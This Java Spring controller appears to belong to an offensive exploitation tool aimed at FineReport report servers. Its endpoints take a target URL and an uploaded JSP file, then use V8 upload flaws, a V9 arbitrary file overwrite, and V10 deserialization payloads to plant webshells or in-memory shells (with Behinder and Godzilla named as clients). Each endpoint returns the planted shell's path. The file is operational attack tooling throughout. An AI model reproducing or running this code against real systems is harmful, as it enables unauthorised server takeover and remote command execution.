package com.droplab.Controller.FineReport;

import com.droplab.Controller.FineReport.Service.*;
import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.FileZipUtils;
import com.droplab.Utils.InfoUtils;
import org.jsoup.Connection;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;

/**
 * 帆软报表漏洞
 */
@Controller
@RequestMapping("/finereport")
public class FineReportController {
    @RequestMapping(value = "/index", method = RequestMethod.GET)
    public String index(Model model) {
        CommonUtils.modelSet(new HashMap<>(), model);
        return "FineReport/index.html";
    }


    @RequestMapping(value = "/V8GETSHELLONE", method = RequestMethod.POST)
    public String V8GETSHELLONE(Model model,
                                @RequestParam(value = "files", required = true) List<MultipartFile> files,
                                @RequestParam(value = "url", required = true) String url,
                                @RequestParam(value = "depth", required = false, defaultValue = "4") String depth,
                                @RequestParam(value = "platform", required = false, defaultValue = "windows") String platform,
                                @RequestParam(value = "cookie", required = false, defaultValue = "") String cookie) {
        try {
            int depthFile = 4;
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }
            HashMap hashMap = new HashMap();
            String filename = CommonUtils.Random();
            hashMap.put("url", url);
            hashMap.put("cookie", cookie);
            if (!depth.equals("") && depth != null) {
                depthFile = Integer.parseInt(depth);
            }
            if (!files.isEmpty()) {
                HashMap<String, String> fileMap = new HashMap<>();
                for (MultipartFile file : files) {
                    String rootPath = System.getProperty("java.io.tmpdir") + "//" + filename + ".jsp";
                    try {
                        File file1 = new File(rootPath);
                        file.transferTo(file1);
                        if (file1.exists()) {
                            fileMap.put(rootPath, "");
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                Path pngPath = Files.write(new File(System.getProperty("java.io.tmpdir") + "//login.png").toPath(), Base64.getDecoder().decode(InfoUtils.base64Png));
                fileMap.put(pngPath.toAbsolutePath().toString(), "");
                /**
                 * 创建压缩包
                 */
                FileZipUtils fileZipUtils = new FileZipUtils(depthFile, platform);
                File zip = fileZipUtils.createZip(fileMap, System.getProperty("java.io.tmpdir") + "//" + CommonUtils.Random() + ".zip");
                hashMap.put("filepath", zip.getAbsolutePath());

                /**
                 * 开始攻击
                 */
                V8FileUploadOne v8GETSHELLONE = (V8FileUploadOne) Class.forName(getMap().get("V8GETSHELLONE")).newInstance();
                v8GETSHELLONE.setParams(hashMap);
                Connection.Response response = v8GETSHELLONE.exploit();
                if (response != null) {
                    HashMap<String, String> modelMap = new HashMap<>();
                    modelMap.put("V8GETSHELLONEurl", url);
                    modelMap.put("V8GETSHELLONE", new String(response.bodyAsBytes()));
                    modelMap.put("V8GETSHELLONEtips", String.format("如果写入成功，webshell路径：%s/WebReport/%s.jsp", url, filename));
                    CommonUtils.modelSet(modelMap, model);
                    return "FineReport/index.html";
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("V8GETSHELLONEurl", url);
        modelMap.put("V8GETSHELLONE", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "FineReport/index.html";

    }


    /**
     * 插件更新上传webshell
     * @param model
     * @param files
     * @param url
     * @param depth
     * @param platform
     * @return
     */
    @RequestMapping(value = "/V8GETSHELLTWO", method = RequestMethod.POST)
    public String V8GETSHELLTWO(Model model,
                                @RequestParam(value = "files", required = true) List<MultipartFile> files,
                                @RequestParam(value = "url", required = true) String url,
                                @RequestParam(value = "depth", required = false, defaultValue = "2") String depth,
                                @RequestParam(value = "platform", required = false, defaultValue = "windows") String platform) {
        try {
            int depthFile = 4;
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }
            HashMap hashMap = new HashMap();
            String filename = CommonUtils.RandomStr(8);
            hashMap.put("url", url);
            if (!depth.equals("") && depth != null) {
                depthFile = Integer.parseInt(depth);
            }
            if (!files.isEmpty()) {
                HashMap<String, String> fileMap = new HashMap<>();
                for (MultipartFile file : files) {
                    String rootPath = System.getProperty("java.io.tmpdir") + "//" + filename + ".jsp";
                    try {
                        File file1 = new File(rootPath);
                        file.transferTo(file1);
                        if (file1.exists()) {
                            fileMap.put(rootPath, "");
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                Path pngPath = Files.write(new File(System.getProperty("java.io.tmpdir") + "//login.png").toPath(), Base64.getDecoder().decode(InfoUtils.base64Png));
                fileMap.put(pngPath.toAbsolutePath().toString(), "");
                /**
                 * 创建压缩包
                 */
                FileZipUtils fileZipUtils = new FileZipUtils(depthFile, platform);
                File zip = fileZipUtils.createZip(fileMap, System.getProperty("java.io.tmpdir") + "//" + CommonUtils.Random() + ".png");
                hashMap.put("filepath", zip.getAbsolutePath());

                /**
                 * 开始攻击
                 */
                V8FileUploadTwo v8FileUploadTwo = (V8FileUploadTwo) Class.forName(getMap().get("V8GETSHELLTWO")).newInstance();
                v8FileUploadTwo.setParams(hashMap);
                Connection.Response response = v8FileUploadTwo.exploit();
                if (response != null) {
                    HashMap<String, String> modelMap = new HashMap<>();
                    modelMap.put("V8GETSHELLTWOurl", url);
                    modelMap.put("V8GETSHELLTWO", new String(response.bodyAsBytes()));
                    modelMap.put("V8GETSHELLTWOtips", String.format("如果写入成功，webshell路径：%s/WebReport/%s.jsp", url, filename));
                    CommonUtils.modelSet(modelMap, model);
                    return "FineReport/index.html";
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("V8GETSHELLTWOurl", url);
        modelMap.put("V8GETSHELLTWO", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "FineReport/index.html";

    }


    /**
     * 帆软V9任意文件覆盖getshell
     * @return
     */
    @RequestMapping(value = "/V9FileOverWrite", method = RequestMethod.POST)
    public String V9GETSHELLRCE(Model model,
                                @RequestParam(value = "files",required = true)List<MultipartFile> files,
                                @RequestParam(value = "url",required = true) String url,
                                @RequestParam(value = "overFile",required = true) String overFile){
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }
            HashMap hashMap = new HashMap();
            hashMap.put("url",url);
            hashMap.put("overFile",overFile);
            if (!files.isEmpty()) {
                for (MultipartFile file : files) {
                    String rootPath = System.getProperty("java.io.tmpdir") + "//" + CommonUtils.RandomStr(8) + ".tmp";
                    try {
                        File file1 = new File(rootPath);
                        file.transferTo(file1);
                        if (file1.exists()) {
                            hashMap.put("filepath", rootPath);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                V9FileOverWrite v9FileOverWrite =(V9FileOverWrite) Class.forName(getMap().get("V9FileOverWrite")).newInstance();
                v9FileOverWrite.setParams(hashMap);
                Connection.Response response = v9FileOverWrite.exploit();
                if (response != null) {
                    HashMap<String, String> modelMap = new HashMap<>();
                    modelMap.put("V9FileOverWriteurl", url);
                    modelMap.put("V9FileOverWrite", new String(response.bodyAsBytes()));
                    modelMap.put("V9FileOverWritetips", String.format("如果写入成功，webshell路径：%s/WebReport/%s", url, overFile));
                    CommonUtils.modelSet(modelMap, model);
                    return "FineReport/index.html";
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("V9FileOverWriteurl", url);
        modelMap.put("V9FileOverWrite", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "FineReport/index.html";

    }


    /**
     * 帆软V10反序列化漏洞payload生成
     * @param model
     * @return
     */
    @RequestMapping(value = "/GetUnserializePayload",method = RequestMethod.POST)
    public String A6V5FastJson(Model model,
                               @RequestParam(value = "mOption",required=true)String mOption,
                               @RequestParam(value = "files", required = false) List<MultipartFile> files,
                               @RequestParam(value = "mType", required = false,defaultValue = "") String mType,
                               @RequestParam(value = "mMiddle", required = false,defaultValue = "") String mMiddle,
                               @RequestParam(value = "path", required = false,defaultValue = "") String path,
                               @RequestParam(value = "mshellType", required = false,defaultValue = "") String mshellType,
                               @RequestParam(value = "password", required = false,defaultValue = "") String password){
        try {
            HashMap hashMap = new HashMap();
            hashMap.put("mOption",mOption);  //攻击类型 落地webshell，注入内存马，命令执行
            if(!mType.equals("")){
                hashMap.put("mType",mType);  //中间件类型，tomcat ，weblogic
            }if(!mMiddle.equals("")){
                hashMap.put("mMiddle",mMiddle); // 内存马类型 filter valve servlet
            }if(!path.equals("")){
                hashMap.put("path",path);   //内存马路径
            }if(!mshellType.equals("")){
                hashMap.put("mshellType",mshellType);  //菜刀类型。冰蝎，哥斯拉
            }if(!password.equals("")){
                hashMap.put("password",password);  //连接密码
            }
            String filename=CommonUtils.RandomStr(8);
            hashMap.put("filename",filename);
            if (files != null && !files.isEmpty()) {
                for (MultipartFile file : files) {
                    String rootPath = System.getProperty("java.io.tmpdir") + "//" + CommonUtils.Random() + ".tmp";
                    try {
                        File file1 = new File(rootPath);
                        file.transferTo(file1);
                        if (file1.exists()) {
                            hashMap.put("filepath", rootPath);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            V10Unserialize v10Unserialize =(V10Unserialize) Class.forName(getMap().get("V10Unserialize")).newInstance();
            v10Unserialize.setParams(hashMap);
            Connection.Response exploit = v10Unserialize.exploit();
            if (exploit != null) {
                HashMap<String, String> modelMap = new HashMap<>();
                String s = new String(exploit.bodyAsBytes());
                modelMap.put("GetUnserializePayload",s);
                modelMap.put("GetUnserializePayloadtips", String.format("如果写入成功，webshell路径：/%s.jsp,密码：%s", filename,password));
                CommonUtils.modelSet(modelMap, model);
                return "FineReport/index.html";
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("GetUnserializePayload", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "FineReport/index.html";
    }


    private Map<String, String> getMap() {
        HashMap<String, String> hashMap = new HashMap<>();
        hashMap.put("V8GETSHELLONE", "com.droplab.Controller.FineReport.Service.V8FileUploadOne");
        hashMap.put("V8GETSHELLTWO", "com.droplab.Controller.FineReport.Service.V8FileUploadTwo");
        hashMap.put("V9FileOverWrite", "com.droplab.Controller.FineReport.Service.V9FileOverWrite");
        hashMap.put("V10Unserialize", "com.droplab.Controller.FineReport.Service.V10Unserialize");
        return hashMap;
    }
}
